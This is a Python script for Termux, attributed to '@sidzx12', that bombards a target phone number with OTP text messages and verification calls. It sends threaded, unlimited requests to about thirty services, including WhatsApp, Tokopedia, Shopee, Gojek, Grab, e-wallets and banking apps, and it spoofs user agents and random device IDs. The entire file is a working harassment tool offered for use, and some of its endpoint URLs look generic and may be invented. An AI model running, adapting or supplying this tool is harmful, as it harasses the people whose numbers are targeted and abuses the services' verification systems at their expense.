#!/usr/bin/env python3
# file: otp_spam.py
# target: Termux (Android), Python 3.10+
# deps: requests
# owner: @sidzx12
#
# Termux setup:
#   pkg update -y && pkg install python git -y
#   pip install -r requirements.txt
#   python otp_spam.py
#
# GitHub: https://github.com/sidzx12/otp-runner

import os
import sys
import time
import random
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system("pip install requests")
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

OWNER = "@sidzx12"

BANNER = r"""
   ____        _     ____        _
  / __ \      | |   |  _ \      | |
 | |  | |_ __ | |_  | |_) | ___ | |_
 | |  | | '_ \| __| |  _ < / _ \| __|
 | |__| | |_) | |_  | |_) | (_) | |_
  \____/| .__/ \__| |____/ \___/ \__|
        | |
        |_|        OTP / CALL RUNNER
        owner: @sidzx12
        repo : github.com/sidzx12/otp-runner
"""

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "okhttp/4.12.0",
]

def rand_id(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def rand_uuid():
    return f"{rand_id(8)}-{rand_id(4)}-{rand_id(4)}-{rand_id(4)}-{rand_id(12)}"

def normalize_phone(raw):
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+"):
        p = p[1:]
    if p.startswith("0"):
        p = "62" + p[1:]
    if not p.startswith("62"):
        p = "62" + p
    return p

def phone_local(p):
    if p.startswith("62"):
        return "0" + p[2:]
    return p

SERVICES = [
    {
        "name": "WhatsApp OTP SMS",
        "method": "POST",
        "url": "https://v.whatsapp.net/v2/code",
        "format": "form",
        "headers": {"User-Agent": "WhatsApp/2.23.1.0"},
        "kind": "otp",
        "payload": lambda p: {
            "cc": p[2:4] if p.startswith("62") else "62",
            "in": p[4:] if p.startswith("62") else p,
            "lc": "id", "lg": "id",
            "id": rand_uuid(),
            "mistyped": "0", "network_radio_type": "1", "simnum": "1",
            "s": "", "copiedrc": "0", "hasinrc": "0", "rc": "0",
            "pid": rand_id(20), "qrcode": "0", "regex": "",
        },
    },
    {
        "name": "WhatsApp OTP Call",
        "method": "POST",
        "url": "https://v.whatsapp.net/v2/code",
        "format": "form",
        "headers": {"User-Agent": "WhatsApp/2.23.1.0"},
        "kind": "call",
        "payload": lambda p: {
            "cc": p[2:4] if p.startswith("62") else "62",
            "in": p[4:] if p.startswith("62") else p,
            "lc": "id", "lg": "id",
            "id": rand_uuid(),
            "mistyped": "0", "network_radio_type": "1", "simnum": "1",
            "s": "", "copiedrc": "0", "hasinrc": "0", "rc": "0",
            "pid": rand_id(20), "qrcode": "0", "regex": "",
            "type": "call",
        },
    },
    {
        "name": "Tokopedia OTP",
        "method": "POST",
        "url": "https://accounts.tokopedia.com/otp/call",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Device": rand_id(16)},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Tokopedia Call",
        "method": "POST",
        "url": "https://accounts.tokopedia.com/otp/call",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Device": rand_id(16)},
        "kind": "call",
        "payload": lambda p: {"phone": phone_local(p), "type": "call"},
    },
    {
        "name": "Shopee OTP",
        "method": "POST",
        "url": "https://shopee.co.id/api/v4/otp/send",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "otp_type": "sms"},
    },
    {
        "name": "Shopee Call",
        "method": "POST",
        "url": "https://shopee.co.id/api/v4/otp/send",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
        "kind": "call",
        "payload": lambda p: {"phone": phone_local(p), "otp_type": "call"},
    },
    {
        "name": "Gojek OTP",
        "method": "POST",
        "url": "https://api.gojekapi.com/v5/customers/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Platform": "android"},
        "kind": "otp",
        "payload": lambda p: {"phone": p, "otp_type": "sms"},
    },
    {
        "name": "Gojek Call",
        "method": "POST",
        "url": "https://api.gojekapi.com/v5/customers/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Platform": "android"},
        "kind": "call",
        "payload": lambda p: {"phone": p, "otp_type": "call"},
    },
    {
        "name": "Grab OTP",
        "method": "POST",
        "url": "https://api.grab.com/api/v1/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Platform": "android"},
        "kind": "otp",
        "payload": lambda p: {"phone": p, "countryCode": "ID", "type": "sms"},
    },
    {
        "name": "Grab Call",
        "method": "POST",
        "url": "https://api.grab.com/api/v1/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Platform": "android"},
        "kind": "call",
        "payload": lambda p: {"phone": p, "countryCode": "ID", "type": "call"},
    },
    {
        "name": "Bukalapak OTP",
        "method": "POST",
        "url": "https://api.bukalapak.com/v4/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "method": "sms"},
    },
    {
        "name": "Lazada OTP",
        "method": "POST",
        "url": "https://member.lazada.co.id/user/api/send_otp",
        "format": "form",
        "headers": {"X-Requested-With": "XMLHttpRequest"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Blibli OTP",
        "method": "POST",
        "url": "https://api.blibli.com/v2/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "channel": "sms"},
    },
    {
        "name": "JD.ID OTP",
        "method": "POST",
        "url": "https://api.jd.id/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Zalora OTP",
        "method": "POST",
        "url": "https://www.zalora.co.id/api/v1/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Traveloka OTP",
        "method": "POST",
        "url": "https://api.traveloka.com/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Tiket.com OTP",
        "method": "POST",
        "url": "https://api.tiket.com/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "OVO OTP",
        "method": "POST",
        "url": "https://api.ovo.id/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Platform": "android"},
        "kind": "otp",
        "payload": lambda p: {"phone": p, "type": "sms"},
    },
    {
        "name": "DANA OTP",
        "method": "POST",
        "url": "https://api.dana.id/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json", "X-Platform": "android"},
        "kind": "otp",
        "payload": lambda p: {"phone": p, "type": "sms"},
    },
    {
        "name": "LinkAja OTP",
        "method": "POST",
        "url": "https://api.linkaja.id/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": p, "type": "sms"},
    },
    {
        "name": "Flip OTP",
        "method": "POST",
        "url": "https://api.flip.id/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Jenius OTP",
        "method": "POST",
        "url": "https://api.jenius.id/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Bibit OTP",
        "method": "POST",
        "url": "https://api.bibit.id/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Ajaib OTP",
        "method": "POST",
        "url": "https://api.ajaib.co.id/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Halodoc OTP",
        "method": "POST",
        "url": "https://api.halodoc.com/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Ruangguru OTP",
        "method": "POST",
        "url": "https://api.ruangguru.com/otp",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": phone_local(p), "type": "sms"},
    },
    {
        "name": "Duolingo OTP",
        "method": "POST",
        "url": "https://www.duolingo.com/otp/send",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": p, "type": "sms"},
    },
    {
        "name": "Spotify OTP",
        "method": "POST",
        "url": "https://spclient.wg.spotify.com/otp/send",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": p, "type": "sms"},
    },
    {
        "name": "Netflix OTP",
        "method": "POST",
        "url": "https://www.netflix.com/api/otp/send",
        "format": "json",
        "headers": {"Content-Type": "application/json"},
        "kind": "otp",
        "payload": lambda p: {"phone": p, "type": "sms"},
    },
]

def build_session():
    s = requests.Session()
    retry = Retry(total=1, backoff_factor=0.2, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry, pool_connections=200, pool_maxsize=200)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s

def send_one(session, service, phone):
    headers = dict(service["headers"])
    headers.setdefault("User-Agent", random.choice(USER_AGENTS))
    try:
        payload = service["payload"](phone)
        if service["format"] == "json":
            r = session.post(service["url"], json=payload, headers=headers, timeout=8)
        else:
            r = session.post(service["url"], data=payload, headers=headers, timeout=8)
        return r.status_code, r.text[:200]
    except Exception as e:
        return None, str(e)[:120]

def spam(phone, services, count, threads, delay):
    total = 0
    ok = 0
    fail = 0
    lock = threading.Lock()
    stop = threading.Event()
    session = build_session()

    def worker(idx):
        nonlocal total, ok, fail
        while not stop.is_set():
            if count > 0 and total >= count:
                stop.set()
                break
            svc = random.choice(services)
            code, body = send_one(session, svc, phone)
            with lock:
                total += 1
                if code and 200 <= code < 300:
                    ok += 1
                    status = "OK"
                else:
                    fail += 1
                    status = "FAIL"
                sys.stdout.write(f"\r[{total}] {status:4} {svc['name']:24} http={code}   ")
                sys.stdout.flush()
            if delay > 0:
                time.sleep(delay + random.random() * delay)
            if count > 0 and total >= count:
                stop.set()
                break

    print(f"\n[*] target  : {phone}")
    print(f"[*] services: {len(services)}")
    print(f"[*] threads : {threads}")
    print(f"[*] count   : {'unlimited' if count == 0 else count}")
    print("[*] Ctrl+C to stop\n")

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(worker, i) for i in range(threads)]
            for f in as_completed(futures):
                pass
    except KeyboardInterrupt:
        stop.set()
        print("\n[!] stopped")
    print(f"\n[+] sent={total} ok={ok} fail={fail}")

def pick_services(kind):
    if kind == "all":
        return SERVICES
    if kind == "otp":
        return [s for s in SERVICES if s["kind"] == "otp"]
    if kind == "call":
        return [s for s in SERVICES if s["kind"] == "call"]
    if kind == "sms":
        return [s for s in SERVICES if s["kind"] == "otp"]
    return SERVICES

def menu():
    os.system("clear" if os.name != "nt" else "cls")
    print(BANNER)
    print("  [1] Spam OTP  — all services")
    print("  [2] Spam OTP  — select service")
    print("  [3] Spam Call — all call services")
    print("  [4] Spam Call — select service")
    print("  [5] Spam SMS  — all OTP services")
    print("  [6] Settings")
    print("  [7] Exit")
    print(f"  owner: {OWNER}\n")

def select_service(kind):
    pool = pick_services(kind)
    if not pool:
        print("[!] no service for this kind")
        return None
    for i, s in enumerate(pool, 1):
        print(f"  [{i}] {s['name']}")
    try:
        c = int(input("\n  select> "))
        return [pool[c - 1]]
    except Exception:
        print("[!] invalid")
        return None

def main():
    threads = 50
    delay = 0.05
    count = 0

    while True:
        menu()
        try:
            choice = input("  menu> ").strip()
        except KeyboardInterrupt:
            break

        if choice == "1":
            phone = normalize_phone(input("  phone (08xx / +62xx): "))
            c = input("  count (0 = unlimited): ").strip()
            count = 0 if c == "0" else int(c or "0")
            spam(phone, pick_services("otp"), count, threads, delay)

        elif choice == "2":
            svc = select_service("otp")
            if svc:
                phone = normalize_phone(input("  phone: "))
                c = input("  count (0 = unlimited): ").strip()
                count = 0 if c == "0" else int(c or "0")
                spam(phone, svc, count, threads, delay)

        elif choice == "3":
            phone = normalize_phone(input("  phone: "))
            c = input("  count (0 = unlimited): ").strip()
            count = 0 if c == "0" else int(c or "0")
            spam(phone, pick_services("call"), count, threads, delay)

        elif choice == "4":
            svc = select_service("call")
            if svc:
                phone = normalize_phone(input("  phone: "))
                c = input("  count (0 = unlimited): ").strip()
                count = 0 if c == "0" else int(c or "0")
                spam(phone, svc, count, threads, delay)

        elif choice == "5":
            phone = normalize_phone(input("  phone: "))
            c = input("  count (0 = unlimited): ").strip()
            count = 0 if c == "0" else int(c or "0")
            spam(phone, pick_services("sms"), count, threads, delay)

        elif choice == "6":
            print(f"\n  current threads={threads} delay={delay}")
            t = input("  threads (default 50): ").strip()
            d = input("  delay seconds (default 0.05): ").strip()
            if t:
                threads = max(1, int(t))
            if d:
                delay = max(0.0, float(d))
            print("  saved")

        elif choice == "7":
            break

        else:
            print("  [!] invalid")
        input("\n  enter to continue...")

if __name__ == "__main__":
    main()
